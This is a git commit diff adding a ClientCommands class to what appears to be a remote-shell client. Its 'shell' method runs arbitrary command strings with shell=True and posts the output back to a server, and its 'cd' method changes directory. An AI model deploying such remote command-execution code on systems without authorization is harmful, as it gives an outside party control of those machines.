38d77162ff9717a1dcee5492918287b8715639a0
EONRaider <livewire_voodoo@protonmail.com>
2021-11-07 18:11:40 -0300

    Add ClientCommands class
    The class was moved from the removed commands.py
    file

--- src/client.py
+++ src/client.py
@@ -5,12 +5,37 @@ __author__ = "EONRaider @ keybase.io/eonraider"
 
 import getpass
 import http.client
+import os
 import platform
 import ssl
+import subprocess
 from pathlib import Path
 from urllib import request, parse
 
-from src.client.commands import ClientCommands
+
+class ClientCommands:
+    def __init__(self, client):
+        self.client = client
+
+    def _send_output(self, message: [str, bytes]) -> None:
+        self.client.post({"output": message})
+
+    def cd(self, dest_dir: [str, list]) -> None:
+        try:
+            dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
+            os.chdir(Path(dest_dir).expanduser())
+        except FileNotFoundError as e:
+            self._send_output(f"{e}\n")
+
+    def shell(self, command: str) -> None:
+        try:
+            cmd = subprocess.run(command, capture_output=True, shell=True)
+        except FileNotFoundError as e:
+            self._send_output(f"{e}\n")
+        else:
+            for result in cmd.stdout, cmd.stderr:
+                if len(result) > 0:
+                    self._send_output(result)
 
 
 class Client:
